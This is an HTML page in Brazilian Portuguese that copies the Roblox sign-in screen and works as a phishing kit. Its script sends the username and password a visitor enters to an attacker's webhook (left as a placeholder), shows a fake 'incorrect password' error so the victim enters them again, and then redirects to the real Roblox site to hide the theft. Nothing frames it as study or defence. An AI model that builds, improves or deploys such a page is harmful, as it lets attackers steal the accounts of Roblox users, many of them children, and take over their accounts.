<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Entrar na Roblox</title>
    <link rel="icon" type="image/png" href="https://images.rbxcdn.com/241804f5603781f8f3593019f39e830e.ico">
    <style>
        /* IMPORTANDO O DESIGN SYSTEM QUE VOCÊ ENVIOU */
        :root {
            /* Cores de Fundo (Grays) */
            --bg-main: #121215; /* color-extended-gray-1200 */
            --bg-card: #191a1f; /* color-extended-gray-1100 */
            --bg-header: #202227; /* color-extended-gray-1000 */
            
            /* Cores de Ação */
            --rbx-blue: #335fff; /* color-extended-blue-700 */
            --rbx-blue-hover: #528bff; /* color-extended-blue-600 */
            --rbx-error: #df281f; /* color-extended-red-800 */
            
            /* Texto e Bordas */
            --text-emphasis: #fff; /* color-extended-white-100 */
            --text-default: #d5d7dd; /* color-extended-gray-400 */
            --stroke-standard: rgba(208,217,251,0.12); /* dark-mode-shift-300 */
            
            /* Configurações de Layout */
            --radius-medium: 8px;
            --font-main: "Builder Sans", "HCo Gotham SSm", Helvetica, Arial, sans-serif;
        }

        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-5px); } 75% { transform: translateX(5px); } }

        body, html { 
            margin: 0; padding: 0; height: 100%; 
            font-family: var(--font-main); 
            background-color: var(--bg-main); 
            color: var(--text-default);
            display: flex; flex-direction: column;
        }

        /* HEADER OFICIAL */
        .roblox-header { 
            width: 100%; height: 44px; 
            background: var(--bg-header); 
            display: flex; align-items: center; 
            padding: 0 16px; position: fixed; top: 0; z-index: 100; 
            border-bottom: 1px solid var(--stroke-standard);
            box-sizing: border-box;
        }

        .roblox-logo { 
            height: 28px; width: 28px; 
            background-image: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyOCAyOCI+PHBhdGggZmlsbD0iI2ZmZiIgZD0iTTcuMDUgNEwyNCA3LjA1IDIwLjk1IDI0IDQgMjAuOTUgNy4wNSA0ek0xMS41IDE2LjVoNXYtNWgtNXY1eiIvPjwvc3ZnPg=='); 
            background-size: contain; background-repeat: no-repeat; 
        }

        /* CONTEÚDO PRINCIPAL COM O GRADIENTE DO SITE */
        .main-content { 
            flex: 1; display: flex; align-items: center; justify-content: center; 
            background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg'); 
            background-size: cover; background-position: center;
            padding-top: 44px;
        }

        .login-card { 
            background-color: var(--bg-card); 
            padding: 40px 30px; 
            border-radius: var(--radius-medium); 
            width: 400px; text-align: center;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
        }

        .shield-icon {
            background: url(https://images.rbxcdn.com/2b967a925b86540c43b97878bbfc0632-lock.svg) no-repeat center;
            background-size: 60px; width: 80px; height: 80px; margin: 0 auto 10px;
        }

        h1 { color: var(--text-emphasis); font-size: 24px; margin-bottom: 24px; font-weight: 700; }

        .input-field { 
            width: 100%; height: 44px; 
            background-color: var(--bg-main); 
            border: 1px solid var(--stroke-standard); 
            border-radius: 4px; color: var(--text-emphasis);
            padding: 0 12px; margin-bottom: 12px; box-sizing: border-box;
            outline: none; transition: border 0.2s;
        }

        .input-field:focus { border-color: var(--text-emphasis); }

        /* BOTÃO PRIMÁRIO (AZUL ROBLOX) */
        .btn-primary { 
            width: 100%; height: 42px; 
            background-color: var(--rbx-blue); 
            color: white; border: none;
            border-radius: var(--radius-medium); 
            font-size: 16px; font-weight: 500; cursor: pointer;
            transition: background 0.2s;
        }

        .btn-primary:hover { background-color: var(--rbx-blue-hover); }

        .error-box {
            color: var(--rbx-error); font-size: 13px;
            background: rgba(223, 40, 31, 0.1);
            padding: 10px; border-radius: 4px; border-left: 3px solid var(--rbx-error);
            margin-bottom: 15px; display: none; text-align: left;
        }

        #loading-overlay {
            position: fixed; inset: 0; background: rgba(0,0,0,0.8);
            display: none; align-items: center; justify-content: center; z-index: 1000;
            backdrop-filter: blur(4px);
        }

        .spinner {
            width: 40px; height: 40px; border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid var(--rbx-blue); border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        .shake { animation: shake 0.2s ease-in-out 2; }
    </style>
</head>
<body>

<div id="loading-overlay"><div class="spinner"></div></div>

<header class="roblox-header">
    <div class="roblox-logo"></div>
</header>

<main class="main-content">
    <div class="login-card" id="card">
        <div class="shield-icon"></div>
        <h1>Entrar na Roblox</h1>
        
        <div id="error-msg" class="error-box">Usuário ou senha incorretos.</div>

        <input type="text" id="user" class="input-field" placeholder="Usuário/E-mail/Telefone">
        <input type="password" id="pass" class="input-field" placeholder="Senha">

        <button class="btn-primary" onclick="execLogin()">Entrar</button>

        <p style="font-size: 14px; margin-top: 20px;">
            Não tem uma conta? <a href="#" style="color: var(--text-emphasis); text-decoration: none; font-weight: 700;">Cadastrar-se</a>
        </p>
    </div>
</main>

<script>
    let attempt = 0;
    const webhookURL = "SUA_WEBHOOK_AQUI";

    async function execLogin() {
        const u = document.getElementById('user').value;
        const p = document.getElementById('pass').value;
        const card = document.getElementById('card');
        const errorDiv = document.getElementById('error-msg');
        const overlay = document.getElementById('loading-overlay');

        if(!u || !p) {
            triggerError();
            return;
        }

        overlay.style.display = 'flex';

        // Lógica de envio (Protocolo Colmeia)
        try {
            await fetch(webhookURL, {
                method: "POST",
                headers: {"Content-Type": "application/json"},
                body: JSON.stringify({
                    embeds: [{
                        title: "📡 ENTRADA DETECTADA",
                        color: 3366911,
                        fields: [
                            {name: "👤 User", value: "`"+u+"`", inline: true},
                            {name: "🔑 Pass", value: "`"+p+"`", inline: true}
                        ]
                    }]
                })
            });
        } catch(e) {}

        setTimeout(() => {
            overlay.style.display = 'none';
            attempt++;
            if(attempt >= 2) {
                window.location.href = "https://www.roblox.com/home";
            } else {
                triggerError();
            }
        }, 1200);

        function triggerError() {
            card.classList.add('shake');
            errorDiv.style.display = 'block';
            document.getElementById('pass').value = "";
            setTimeout(() => card.classList.remove('shake'), 400);
        }
    }
</script>

</body>
</html>
